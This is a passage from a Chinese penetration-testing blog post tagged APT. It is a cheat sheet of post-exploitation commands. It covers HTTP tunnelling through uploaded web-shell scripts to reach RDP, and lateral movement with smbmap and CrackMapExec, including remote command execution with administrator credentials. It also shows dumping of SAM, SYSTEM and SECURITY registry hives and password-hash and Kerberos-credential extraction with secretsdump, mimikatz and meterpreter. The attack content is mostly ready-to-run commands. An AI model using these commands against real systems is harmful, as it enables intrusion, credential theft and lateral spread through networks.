<h2 id="99-HTTP隧道Tunna第三季"><a href="#99-HTTP隧道Tunna第三季" class="headerlink" title="99. HTTP隧道Tunna第三季"></a>99. HTTP隧道Tunna第三季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py ‐u http:&#x2F;&#x2F;192.168.1.119&#x2F;conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v</span><br></pre></td></tr></table></figure>
<p>如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</p>
<p>注册表键值： HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers 删除对应IP键值即可</p>
<h2 id="100-HTTP隧道reDuh第四季"><a href="#100-HTTP隧道reDuh第四季" class="headerlink" title="100. HTTP隧道reDuh第四季"></a>100. HTTP隧道reDuh第四季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar reDuhClient.jar http:&#x2F;&#x2F;192.168.1.119&#x2F;reDuh.aspx</span><br></pre></td></tr></table></figure>
<h1 id="八、横向渗透"><a href="#八、横向渗透" class="headerlink" title="八、横向渗透"></a>八、横向渗透</h1><h2 id="55-与Smbmap结合攻击"><a href="#55-与Smbmap结合攻击" class="headerlink" title="55. 与Smbmap结合攻击"></a>55. 与Smbmap结合攻击</h2><ul>
<li><p>支持传递哈希 </p>
</li>
<li><p>文件上传/下载/删除 </p>
</li>
<li><p>可枚举（可写共享，配合Metasploit） </p>
</li>
<li><p>远程命令执行 </p>
</li>
<li><p>支持文件内容搜索 </p>
</li>
<li><p>支持文件名匹配（可以自动下载） </p>
</li>
<li><p>msf配合Smbmap攻击需要使用到sock4a模块 </p>
<p><code>sock4a</code>配置好<code>1080</code>端口代理后，同时配置<code>proxychains</code>代理设置</p>
<ul>
<li>远程执行命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbmap ‐u administrator ‐p 123456 ‐d workgroup ‐H 192.168.1.115 ‐x &#39;net user&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举目标机共享</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbmap ‐u administrator ‐p 123456 ‐d workgroup ‐H 192.168.1.115 ‐d ABC</span><br></pre></td></tr></table></figure>
<h2 id="56-离线提取目标机hash"><a href="#56-离线提取目标机hash" class="headerlink" title="56. 离线提取目标机hash"></a>56. 离线提取目标机hash</h2></li>
<li><p>reg save方式</p>
<ul>
<li>reg save HKLM\SYSTEM sys.hiv</li>
<li>reg save HKLM\SAM sam.hiv</li>
<li>reg save hklm\security security.hiv </li>
</ul>
</li>
<li><p>离线提权</p>
<ul>
<li><code>impacket</code> 的 <code>secretsdump.py</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &#x2F;root&#x2F;impacket&#x2F;examples&#x2F;secretsdump.py ‐sam sam.hiv ‐ security security.hiv ‐system sys.hiv LOCAL</span><br></pre></td></tr></table></figure>
<h2 id="57-64-高级持续渗透-后门"><a href="#57-64-高级持续渗透-后门" class="headerlink" title="57-64. 高级持续渗透-后门"></a>57-64. 高级持续渗透-后门</h2></li>
</ul>
<h2 id="65-离线提取目标机hash补充"><a href="#65-离线提取目标机hash补充" class="headerlink" title="65. 离线提取目标机hash补充"></a>65. 离线提取目标机hash补充</h2><ul>
<li>mimikatz离线导hash命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;system:sys.hiv &#x2F;sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure>
<ul>
<li>mimikatz在线导hash命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>meterpreter</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">kerberos</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
<h2 id="91-从目标文件中做信息搜集第一季"><a href="#91-从目标文件中做信息搜集第一季" class="headerlink" title="91. 从目标文件中做信息搜集第一季"></a>91. 从目标文件中做信息搜集第一季</h2><ul>
<li>Exiftool</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool ‐lang zh‐cn ‐a ‐u ‐g1 .&#x2F;55e736d12f2eb9385716e513d8628535e4dd6fdc.jpg</span><br></pre></td></tr></table></figure>
<h2 id="93-与CrackMapExec结合攻击"><a href="#93-与CrackMapExec结合攻击" class="headerlink" title="93. 与CrackMapExec结合攻击"></a>93. 与CrackMapExec结合攻击</h2><p>CrackMapExec弥补了MSF4下auxiliary，scanner模块下的Command执行方式，但MSF5已解决该 问题。在MSF4下，该框架针对后渗透的横向移动经常出现，虽然MSF5已解决该问题，但该框架在配合 bloodhound与empire依然目前有一定优势</p>
<ul>
<li>安装</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Kali</span><br><span class="line">apt‐get install crackmapexec</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;作者推荐</span><br><span class="line">apt‐get install ‐y libssl‐dev libffi‐dev python‐dev build‐essential </span><br><span class="line">pip install ‐‐user pipenv </span><br><span class="line">git clone ‐‐recursive https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec </span><br><span class="line">cd CrackMapExec &amp;&amp; pipenv install </span><br><span class="line">pipenv shell</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Mac OSX</span><br><span class="line">pip install ‐‐user crackmapexec</span><br></pre></td></tr></table></figure>
<ul>
<li>获取smb信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>
<ul>
<li>密码策略</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.119 ‐u administrator ‐p &#39;123456&#39; ‐‐pass ‐pol</span><br></pre></td></tr></table></figure>
<ul>
<li>获取本地密码哈希</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.119 ‐u administrator ‐p &#39;123456&#39; ‐‐sam</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举组</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.119 ‐u administrator ‐p &#39;123456&#39; ‐‐local‐groups</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举目标机disk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐disks</span><br></pre></td></tr></table></figure>
<ul>
<li><p>执行模式</p>
<ul>
<li>mmcexec</li>
<li>smbexec</li>
<li>wmiexec(默认)</li>
<li>atexec</li>
</ul>
</li>
<li><p>基于smbexec执行Command</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method smbexec ‐x &#39;net user&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>基于dcom执行Command</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method mmcexec ‐x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>基于wmi执行Command </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method wmiexec ‐x &#39;whoami&#39;</span><br><span class="line"></span><br><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐x &#39;whoami&#39;  &#x2F;&#x2F;-x 即采用默认方式</span><br></pre></td></tr></table></figure>
<ul>
<li>基于AT执行Command</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method atexec ‐x &#39;calc&#39;</span><br></pre></td></tr></table></figure>
<h1 id="九、-其它"><a href="#九、-其它" class="headerlink" title="九、 其它"></a>九、 其它</h1><h2 id="36-解决vps上ssh掉线"><a href="#36-解决vps上ssh掉线" class="headerlink" title="36. 解决vps上ssh掉线"></a>36. 解决vps上ssh掉线</h2><ul>
<li><p>TMUX</p>
<blockquote>
<p>Tmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权。使用它最直 </p>
<p>观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪 </p>
<p>费”多余的终端来连接这台远程主机</p>
</blockquote>
<blockquote>
<p>tmux new -s session1 新建会话 </p>
<p>ctrl+b d 退出会话，回到shell的终端环境 //tmux detach-client </p>
<p>tmux ls 终端环境查看会话列表 </p>
<p>ctrl+b s 会话环境查看会话列表 </p>
<p>tmux a -t session1 从终端环境进入会话 </p>
<p>tmux kill-session -t session1 销毁会话 </p>
<p>tmux rename -t old_session_name new_session_name 重命名会话 </p>
<p>ctrl + b $ 重命名会话 (在会话环境中)</p>
</blockquote>
</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/APT/" rel="tag"># APT</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
            </div>
            <div class="post-nav-item">
                <a href="/2021/01/13/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/" rel="next" title="在命令执行的情况下上线的几种方式-Windows">
                  在命令执行的情况下上线的几种方式-Windows <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>







<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">nicaishui</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">154k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:20</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class=""></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class=""></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/local-search.js"></script>






  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
